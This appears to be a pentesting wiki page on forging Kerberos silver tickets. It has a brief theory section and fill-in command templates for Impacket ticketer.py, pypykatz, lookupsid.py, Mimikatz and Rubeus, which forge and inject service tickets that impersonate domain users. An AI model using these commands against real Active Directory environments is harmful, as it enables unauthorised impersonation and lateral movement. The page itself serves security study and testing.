---
title: "Silver Ticket"
description: Forge service tickets using a compromised service account key, where validation permits
categories: [Active Directory, Lateral Movement]
tags: [Active Directory, Kerberos, Silver Ticket, Lateral Movement, Privilege Escalation]
weight: 2
---

## Theory
**Service Tickets (STs)** are encrypted with a long-term key of the account associated with the **service principal**. An attacker who knows that account's password or the appropriate key can forge a service ticket, called a **silver ticket**, containing an impersonated identity. Acceptance depends on the service's ticket and PAC validation: the service account key alone cannot produce valid KDC signatures. Updated Windows PAC validation can therefore reject these tickets; this is not a guaranteed way to impersonate any user.

## Linux Perspective
We may use `ticketer.py` from the Impacket suite to craft a silver ticket for a domain user, subject to the validation limits above. Set `<user_rid>` to that user's RID rather than relying on the default of 500.
```bash
# With NT hash
ticketer.py -nthash <nt_hash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> -user-id <user_rid> <impersonated_user>
```
```bash
# With AES (128-bit or 256-bit) key
ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain> -spn <SPN> -user-id <user_rid> <impersonated_user>
```

{{% alert title="Tip" %}}
If you only have the service account's cleartext password, you can use `pypykatz` to obtain the NT hash.
```bash
pypykatz crypto nt "<password>"
```
{{% /alert %}}
{{% alert title="Tip" %}}
The domain SID can be obtained using various methods, including `lookupsid.py`:
```bash
lookupsid.py -hashes "ffffffffffffffffffffffffffffffff:<nt_hash>" "<domain>/<username>@<dc_host>" 0
```
{{% /alert %}}

## Windows Perspective
Mimikatz can be used to craft silver tickets on a Windows machine, subject to the same validation limits.
- The `<spn_type>` is the target service's SPN service class, such as `cifs`, `http`, `ldap`, `host`, or `rpcss`. Use the key of the account that owns that SPN.
```cmd
# with an NT hash
kerberos::golden /domain:<domain> /sid:<domain_sid> /rc4:<nt_hash> /user:<impersonated_user> /id:<user_rid> /target:<target_host> /service:<spn_type> /ptt

# with an AES 128 key
kerberos::golden /domain:<domain> /sid:<domain_sid> /aes128:<aes128_key> /user:<impersonated_user> /id:<user_rid> /target:<target_host> /service:<spn_type> /ptt

# with an AES 256 key
kerberos::golden /domain:<domain> /sid:<domain_sid> /aes256:<aes256_key> /user:<impersonated_user> /id:<user_rid> /target:<target_host> /service:<spn_type> /ptt
```

Alternatively, Rubeus may also be used.
```cmd
# With NT hash
Rubeus.exe silver /rc4:<nt_hash> /user:<impersonated_user> /id:<user_rid> /service:<SPN> /domain:<domain> /sid:<domain_sid>
Rubeus.exe silver /aes128:<aes128_key> /user:<impersonated_user> /id:<user_rid> /service:<SPN> /domain:<domain> /sid:<domain_sid>
Rubeus.exe silver /aes256:<aes256_key> /user:<impersonated_user> /id:<user_rid> /service:<SPN> /domain:<domain> /sid:<domain_sid>
```
